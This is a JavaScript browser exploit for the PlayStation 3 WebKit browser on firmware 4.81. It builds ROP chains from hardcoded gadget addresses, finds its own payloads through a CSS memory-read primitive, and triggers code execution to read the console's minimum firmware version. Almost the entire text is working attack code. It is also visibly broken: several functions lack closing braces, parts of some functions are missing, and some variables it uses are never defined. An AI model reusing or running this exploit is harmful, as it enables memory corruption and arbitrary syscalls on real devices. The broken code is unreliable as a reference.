    <script>
        // ============================================================
        // WebKit exploit – stripped to read min firmware only
        // Addresses hardcoded for 4.81 (from HEN source)
        // ============================================================

        function WebKit_showResult(str) {
            document.getElementById('WebKit_result').innerHTML = str;
        }

        // ---- 4.81 addresses (from HEN) ----
        var WebKit_gtemp_addr = 0x8D000000;
        var WebKit_sp_exit = 0x8FD8DCC0;
        var WebKit_dbyte41 = 0x4141;
        var WebKit_dbyte00 = 0;
        var WebKit_mbytes = 0x100000;

        // 4.81 specific
        var WebKit_toc_addr = 0x6F5520;
        var WebKit_gadget1_addr = 0x097604;
        var WebKit_gadget_mod1_addr = 0x60EF9C;
        var WebKit_gadget_mod2_addr = 0x013B74;
        var WebKit_gadget_mod4a_addr = 0x0D9684;
        var WebKit_gadget_mod4b_addr = 0x42C7D4;
        var WebKit_gadget_mod4c_addr = 0x054AF0;
        var WebKit_gadget_mod8_addr = 0x2BACB4;
        var WebKit_gadget3_addr = 0x0D9684;
        var WebKit_gadget7_addr = 0x1A6AC;
        var WebKit_gadget8_addr = 0x20000; // for callsub

        // ---- Helper functions (same as before) ----
        function WebKit_hex16(s) { return ('0000' + s).slice(-4); }
        function WebKit_s2hex(str) {
            var hex = [];
            for (var i = 0; i < str.length; i++) {
                hex.push(WebKit_hex16(str.charCodeAt(i).toString(16)));
            }
            return hex.join("");
        }
        function WebKit_hexh2bin(hex_val) { return String.fromCharCode(hex_val); }
        function WebKit_hexw2bin(hex_val) { return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val); }
        function WebKit_hexdw2bin(hex_val) { return WebKit_hexw2bin(0) + WebKit_hexw2bin(hex_val); }
        function WebKit_fill_by_4bytes(nbytes, hex_val) {
            var stemp = '', iterator = 0, tmp = WebKit_hexh2bin(hex_val);
            while (iterator < nbytes / 4) { stemp += tmp.WebKit_repeat(2); iterator++; }
            return stemp;
        }
        function WebKit_fill_by_8bytes(nbytes, hex_val) {
            var stemp = '', iterator = 0, tmp = WebKit_hexh2bin(hex_val);
            while (iterator < nbytes / 8) { stemp += tmp.WebKit_repeat(4); iterator++; }
            return stemp;

        function WebKit_fill_by_16bytes(nbytes, hex_val) {
            var stemp = '', iterator = 0, tmp = WebKit_hexh2bin(hex_val);
            while (iterator < nbytes / 16) { stemp += tmp.WebKit_repeat(8); iterator++; }
            return stemp;

        String.prototype.WebKit_repeat = function(num) { return new Array(num + 1).join(this); };
        String.prototype.WebKit_replaceAt = function(index, ch) { return this.substr(0, index) + ch + this.substr(index + ch.length); };
        String.prototype.WebKit_convert = function(ascii) {
            if (this.length < 1) return '';
            var asciistr = '';
            var i = 0, ret = [];
            if (ascii === true) asciistr = this;
            else {
                asciistr = '';
                for (var j = 0; j < this.length; j++) {
                    asciistr += WebKit_hex16(this.charCodeAt(j).toString(16));
                }
            }
            while ((asciistr.length % 4) !== 0) asciistr += '00';
            if (asciistr.substr(asciistr.length - 3, 2) !== '00') asciistr += '0000';
            while (i < asciistr.length) {
                ret.push(String.fromCharCode(parseInt(asciistr.substr(i, 4), 16)));
                i += 4;
            }
            return ret.join('');
        };

        Number.prototype.WebKit_noExponents = function() {
            var data = String(this).split(/[eE]/);
            if (data.length === 1) return data[0];
            var z = '', sign = this < 0 ? '-' : '', str = data[0].replace('.', ''), mag = Number(data[1]) + 1;
            if (mag < 0) { z = sign + '0.'; while (mag++) z += '0'; return z + str.replace(/^\-/, ''); }
            mag -= str.length; while (mag--) z += '0'; return str + z;
        };

        function WebKit_fromIEEE754(bytes, ebits, fbits) {
            var retNumber = 0, bits = [], i, j, byte;
            for (i = bytes.length; i; i -= 1) {
                byte = bytes[i - 1];
                for (j = 8; j; j -= 1) {
                    bits.push(byte % 2 ? 1 : 0);
                    byte = byte >> 1;
                }
            }
            bits.reverse();
            var str = bits.join('');
            var bias = (1 << (ebits - 1)) - 1;
            var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
            var e = parseInt(str.substring(1, 1 + ebits), 2);
            var f = parseInt(str.substring(1 + ebits), 2);
            if (e === (1 << ebits) - 1) { retNumber = f !== 0 ? NaN : s * Infinity; } else if (e > 0) { retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits)); } else if (f !== 0) { retNumber = s * Math.pow(2, -(bias - 1)) * (f / Math.pow(2, fbits)); } else { retNumber = s * 0; }
            return retNumber.WebKit_noExponents();
        }

        function WebKit_generateIEEE754(address, size) {
            var hex = new Array(
                (address >> 24) & 0xFF, (address >> 16) & 0xFF, (address >> 8) & 0xFF, (address) & 0xFF,
                (size >> 24) & 0xFF, (size >> 16) & 0xFF, (size >> 8) & 0xFF, (size) & 0xFF
            );
            return WebKit_fromIEEE754(hex, 11, 52);
        }

        function WebKit_generateExploit(address, size) {
            var n = (address << 32) | ((size >> 1) - 1);
            return WebKit_generateIEEE754(address, (n - address));
        }

        function WebKit_readMemory(address, size) {
            var el = document.getElementById('WebKit_exploit');
            if (el) {
                el.style.src = "local(" + WebKit_generateExploit(address, size) + ")";
            }
        }

        function WebKit_checkMemory(address, size, len) {
            var el = document.getElementById('WebKit_exploit');
            if (el) {
                WebKit_readMemory(address, size);
                return el.style.src.substr(6, len);
            }
            return "";
        }

        function WebKit_checkMemOld(address, size, len, sub) {
            var el = document.getElementById('WebKit_exploit');
            if (el) {
                WebKit_readMemory(address, size);
                return el.style.src.substr(sub, len);
            }
            return "";
        }

        function WebKit_findJsVariableOffset(name, exploit_data, base, size, end) {
            var block = 0;
            while ((base + block * size) < end) {
                WebKit_readMemory(base + block * size, size);
                var offset = document.getElementById('WebKit_exploit').style.src.substr(6, size).indexOf(exploit_data);
                if (offset > 0) {
                    return base + block * size + (offset * 2) + 4;
                }
                block++;
            }
            return 0;
        }

        // ---- ROP functions ----
        function WebKit_syscall_r3_p2p(sc, r3_ptr, r4, r5, r6, r7, r8, r9, r10, r31out) {
            if (r31out === null) r31out = WebKit_gtemp_addr;
            return WebKit_hexdw2bin(WebKit_gadget_mod2_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod1_addr) + WebKit_fill_by_16bytes(0x50, WebKit_dbyte41) + WebKit_fill_by_4bytes(0xC, WebKit_dbyte41) +
                WebKit_hexw2bin(sc) + WebKit_hexw2bin(r10) + WebKit_hexw2bin(r8) + WebKit_hexw2bin(r7) + WebKit_hexw2bin(r6) + WebKit_hexw2bin(r5) + WebKit_hexw2bin(r4) + WebKit_fill_by_4bytes(0x4, WebKit_dbyte41) + WebKit_hexw2bin(r9) + WebKit_fill_by_16bytes(0x20, WebKit_dbyte41) + WebKit_hexdw2bin(r3_ptr) +
                WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod4b_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(r31out) + WebKit_hexdw2bin(WebKit_sp_exit) + WebKit_fill_by_8bytes(0x8, WebKit_dbyte41);
        }

        function WebKit_syscall_r3r5_p2p(sc, r3_ptr, r4, r5_ptr, r6, r7, r8, r9, r10, r31out) {
            if (r31out === null) r31out = WebKit_gtemp_addr;
            return WebKit_hexdw2bin(WebKit_gadget_mod2_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod1_addr) + WebKit_fill_by_16bytes(0x50, WebKit_dbyte41) + WebKit_fill_by_4bytes(0xC, WebKit_dbyte41) +
                WebKit_hexw2bin(sc) + WebKit_hexw2bin(r10) + WebKit_hexw2bin(r8) + WebKit_hexw2bin(r7) + WebKit_hexw2bin(r6) + WebKit_fill_by_4bytes(0x4, WebKit_dbyte41) + WebKit_hexw2bin(r4) + WebKit_fill_by_4bytes(0x4, WebKit_dbyte41) + WebKit_hexw2bin(r9) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(r5_ptr - 0x4) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_8bytes(0x18, WebKit_dbyte41) +
                WebKit_hexdw2bin(WebKit_gadget_mod4c_addr) + WebKit_fill_by_16bytes(0xB0, WebKit_dbyte41) + WebKit_hexdw2bin(r3_ptr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) +
                WebKit_hexdw2bin(WebKit_gadget_mod4b_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(r31out) + WebKit_hexdw2bin(WebKit_sp_exit) + WebKit_fill_by_8bytes(0x8, WebKit_dbyte41);
        }

        function WebKit_syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, r31out) {
            if (r31out === null) r31out = WebKit_gtemp_addr;
            return WebKit_hexdw2bin(WebKit_gadget_mod2_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod1_addr) + WebKit_fill_by_16bytes(0x50, WebKit_dbyte41) + WebKit_fill_by_4bytes(0xC, WebKit_dbyte41) + WebKit_hexw2bin(sc) + WebKit_hexw2bin(r10) +
                WebKit_hexw2bin(r8) + WebKit_hexw2bin(r7) + WebKit_hexw2bin(r6) + WebKit_hexw2bin(r5) + WebKit_hexw2bin(r4) + WebKit_fill_by_4bytes(0x4, WebKit_dbyte41) + WebKit_hexw2bin(r9) + WebKit_fill_by_16bytes(0x20, WebKit_dbyte41) + WebKit_hexdw2bin(r3) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod2_addr) +
                WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gtemp_addr) + WebKit_fill_by_16bytes(0x10, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_gadget_mod4a_addr) + WebKit_fill_by_16bytes(0x60, WebKit_dbyte41) + WebKit_hexdw2bin(r31out) + WebKit_hexdw2bin(WebKit_sp_exit) + WebKit_fill_by_8bytes(0x8, WebKit_dbyte41);
        }

        function WebKit_stack_frame_hookup() {
            return unescape("\u4141\u2A2F") + WebKit_hexw2bin(WebKit_gadget1_addr) + WebKit_hexw2bin(WebKit_toc_addr) + WebKit_fill_by_16bytes(0x20, WebKit_dbyte41) + WebKit_hexdw2bin(WebKit_toc_addr) + WebKit_fill_by_16bytes(0x70, WebKit_dbyte41);
        }

        function WebKit_stack_frame_exit() {
            return WebKit_hexdw2bin(WebKit_gadget_mod8_addr) + unescape("\u2F2A");
        }

        function WebKit_trigger(exploit_addr) {
            if (document.getElementById('WebKit_trigger')) {
                document.getElementById("WebKit_trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");

        // ---- Offset search ----
        var WebKit_xtra_data, WebKit_stack_frame, WebKit_jump_2, WebKit_jump_1;
        var WebKit_xtra_data_addr = 0,
            WebKit_stack_frame_addr = 0,
            WebKit_jump_2_addr = 0,
            WebKit_jump_1_addr = 0;
        var WebKit_search_max_threshold, WebKit_search_base, WebKit_search_size;
        var WebKit_total_loops = 0,
            WebKit_max_loops = 20,
            WebKit_t_out = 0,
            WebKit_frame_fails = 0,
            WebKit_search_base_off = 0,
            WebKit_search_size_ext = 0;
        var WebKit_fail_msg_frag = "<h3><span style='color:red'>Memory search failed! Restart the browser and try again.</h3></span>";

        // Minimal data for the ROP chain

        var WebKit_dump_file = "PS3FlashDump493OFW.bin";

        function WebKit_load_check() {

            } else {
                WebKit_total_loops = 0;
                WebKit_showResult(WebKit_fail_msg_frag);

        function WebKit_initROP(init) {
            // create dummy elements if needed
            if (!document.getElementById('WebKit_init')) {

                btn.type = 'button';

            if (!document.getElementById('WebKit_nand')) {

            if (!document.getElementById('WebKit_usbList')) {

                usbSelect.id = 'WebKit_usbList';

                opt.text = '/dev_usb000/';
                usbSelect.appendChild(opt);
                document.body.appendChild(usbSelect);
            }

            document.getElementById("WebKit_init").disabled = true;
            document.getElementById("WebKit_nand").disabled = true;
            try {
                if (init === true) { WebKit_frame_fails = 0; WebKit_search_base_off = 0; WebKit_search_size_ext = 0; }
                if (WebKit_t_out !== 0) { clearTimeout(WebKit_t_out); WebKit_t_out = 0; }
                WebKit_xtra_data_addr = 0;
                WebKit_stack_frame_addr = 0;
                WebKit_jump_2_addr = 0;
                WebKit_jump_1_addr = 0;
                WebKit_search_max_threshold = 70 * 0x100000;
                WebKit_search_base = 0x80100000;
                WebKit_search_size = 2 * WebKit_mbytes;
                WebKit_search_base_off = 0;
                WebKit_search_size_ext = 0;
                WebKit_total_loops++;

                WebKit_xtra_data = WebKit_base_file.WebKit_convert() +
                    unescape("\u0000\u0000\u0000\u0000\u0000\u0000") +
                    "rb".WebKit_convert() +
                    unescape("\u0000\u4141\u4141\u4141\u4141") +
                    WebKit_hexw2bin(WebKit_gadget3_addr) +
                    WebKit_hexw2bin(WebKit_toc_addr) +
                    unescape("\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141") +
                    WebKit_hexw2bin(WebKit_gadget7_addr) +
                    WebKit_hexw2bin(WebKit_toc_addr) +
                    unescape("\u0000\u0000") +
                    "/dev_flash/vsh/module/vsh.self".WebKit_convert() +
                    unescape("\u0000\u0000") +
                    WebKit_fulldumppath.WebKit_convert() +
                    WebKit_fwrite_mode.WebKit_convert() +
                    WebKit_hexw2bin(WebKit_gadget3_addr) +
                    WebKit_hexw2bin(WebKit_toc_addr) +
                    unescape("\u4141\u4141\u4141\u4141\uFD7E\u0000\u0000") +
                    "a+b".WebKit_convert() +
                    unescape("\u0000\u0000") +
                    (WebKit_dump_path + WebKit_dump_file).WebKit_convert() +
                    unescape("\u0000\u0000\u0000\u0000\u0000\u0000\uFD7E");

                while (WebKit_xtra_data_addr === 0) {
                    if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
                    WebKit_xtra_data = WebKit_xtra_data.WebKit_replaceAt(0, WebKit_hexh2bin(0x7EFD));
                    WebKit_xtra_data_addr = WebKit_findJsVariableOffset("WebKit_xtra_data", WebKit_xtra_data, WebKit_search_base, WebKit_search_size, WebKit_search_base + WebKit_search_max_threshold);
                    WebKit_search_max_threshold -= WebKit_search_size;
                }

                var vsh_addr = WebKit_xtra_data_addr + 0x5E;
                WebKit_stack_frame = WebKit_stack_frame_hookup() +
                    WebKit_syscall(0x35F, 0x00006011, 0x1, 0x8B000000, 0, 0, 0, 0, 0) +
                    WebKit_syscall(0x321, WebKit_xtra_data_addr, 0x0, 0x8e000000, 0, 0, 0, 0, 0) +
                    WebKit_syscall_r3r5_p2p(0x322, 0x8e000000, 0x8a000000, 0x11000, 0x8e000008, 0, 0, 0, 0, 0, 0) +
                    WebKit_syscall_r3_p2p(0x324, 0x8e000000, 0, 0, 0, 0, 0, 0, 0, 0, 0) +
                    WebKit_syscall(0x321, vsh_addr, 0x0, 0x8e001000, 0, 0, 0, 0, 0) +
                    WebKit_syscall_r3r5_p2p(0x322, 0x8e001000, 0x8a500000, 0x11000, 0x8e001008, 0, 0, 0, 0, 0, 0) +
                    WebKit_syscall_r3_p2p(0x324, 0x8e001000, 0, 0, 0, 0, 0, 0, 0, 0, 0) +
                    WebKit_stack_frame_exit();

                while (WebKit_stack_frame_addr === 0) {
                    if (WebKit_search_max_threshold < WebKit_search_size + WebKit_search_size_ext) { WebKit_frame_fails++; if ((WebKit_frame_fails % 10) === 0) { WebKit_search_base_off += 0; WebKit_search_size_ext += 0; } WebKit_load_check(); return; }
                    WebKit_stack_frame = WebKit_stack_frame.WebKit_replaceAt(0, WebKit_hexh2bin(0x2A2F));
                    WebKit_stack_frame_addr = WebKit_findJsVariableOffset("WebKit_stack_frame", WebKit_stack_frame, WebKit_search_base + WebKit_search_base_off, WebKit_search_size + WebKit_search_size_ext, WebKit_search_base + WebKit_search_max_threshold);
                    if (WebKit_stack_frame_addr == -1) if (WebKit_search_max_threshold < WebKit_search_size + WebKit_search_size_ext) { WebKit_frame_fails++; WebKit_load_check(); return; }
                    WebKit_search_max_threshold -= WebKit_search_size + WebKit_search_size_ext;
                }

                WebKit_jump_2 = unescape("\u0102\u7EFB") + WebKit_fill_by_16bytes(0x30, 0x8282) + WebKit_hexw2bin(WebKit_stack_frame_addr) + unescape("\uFB7E");
                while (WebKit_jump_2_addr === 0) {

                    WebKit_jump_2 = WebKit_jump_2.WebKit_replaceAt(0, WebKit_hexh2bin(0x7EFB));

                    if (WebKit_jump_2_addr == -1) if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
                    WebKit_search_max_threshold -= WebKit_search_size;
                }

                WebKit_jump_1 = unescape("\u4141\u7EFA") + WebKit_hexw2bin(WebKit_jump_2_addr) + unescape("\uFA7E");
                while (WebKit_jump_1_addr === 0) {
                    if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
                    WebKit_jump_1 = WebKit_jump_1.WebKit_replaceAt(0, WebKit_hexh2bin(0x7EFA));
                    WebKit_jump_1_addr = WebKit_findJsVariableOffset("WebKit_jump_1", WebKit_jump_1, WebKit_search_base, WebKit_search_size, WebKit_search_base + WebKit_search_max_threshold);
                    if (WebKit_jump_1_addr == -1) if (WebKit_search_max_threshold < WebKit_search_size) { WebKit_load_check(); return; }
                    WebKit_search_max_threshold -= WebKit_search_size;
                }

                var sf = WebKit_checkMemory(WebKit_stack_frame_addr - 0x4, 0x10000, WebKit_stack_frame.length);
                var x = WebKit_checkMemory(WebKit_xtra_data_addr - 0x4, 0x4000, WebKit_xtra_data.length);
                var j2 = WebKit_checkMemory(WebKit_jump_2_addr - 0x4, 0x2000, WebKit_jump_2.length);
                var j1 = WebKit_checkMemory(WebKit_jump_1_addr - 0x4, 0x2000, WebKit_jump_1.length);

                if ((j2 === WebKit_jump_2) && (j1 === WebKit_jump_1) && (x === WebKit_xtra_data) && (sf === WebKit_stack_frame)) {
                    if (WebKit_t_out !== 0) { clearTimeout(WebKit_t_out); }
                    WebKit_showResult("<h3><span style='color:green'>Offsets found! Auto-triggering exploit...</span></h3>");
                    setTimeout(function() { WebKit_triggerX(); }, 500);

        }

        function WebKit_triggerX() {
            document.getElementById("WebKit_init").disabled = true;
            setTimeout(WebKit_trigger, 50, WebKit_jump_1_addr);
            WebKit_showResult("<h3>Triggering exploit... Please wait.</h3>");
            setTimeout(WebKit_minVer, 3000);
            WebKit_t_out = 0;
            WebKit_total_loops = 0;
        }

        function WebKit_minVer() {
            var rawMem = WebKit_checkMemOld(0x8B000000 - 0x8, 0x100, 0x100, 10);
            if (!rawMem) {
                WebKit_showResult("<h3><span style='color:orange'>Error: Could not read memory. Make sure you are on OFW 4.81 and have triggered the exploit.</span></h3>");
                return;
            }
            var minver = WebKit_s2hex(rawMem).toString().slice(3, 8).replace("00", ".");
            var parsedVer = parseFloat(minver);
            if (isNaN(parsedVer) || parsedVer > 3.56) {
                WebKit_showResult("<h3><span style='color:red'>Minimum firmware: " + (isNaN(parsedVer) ? "unknown" : parsedVer.toFixed(2)) + " – this console is NOT compatible with CFW.</span></h3>");
            } else {
                WebKit_showResult("<h3><span style='color:green; font-size: 1.2em;'>Minimum firmware: " + parsedVer.toFixed(2) + " – CFW compatible!</span></h3>");
            }
        }

        // ---- Start ----
        document.getElementById('WebKit_startBtn').onclick = function() {
            this.disabled = true;
            WebKit_showResult("<h3>Starting exploit... Searching for offsets.</h3>");
            WebKit_initROP(true);
        };
    </script>
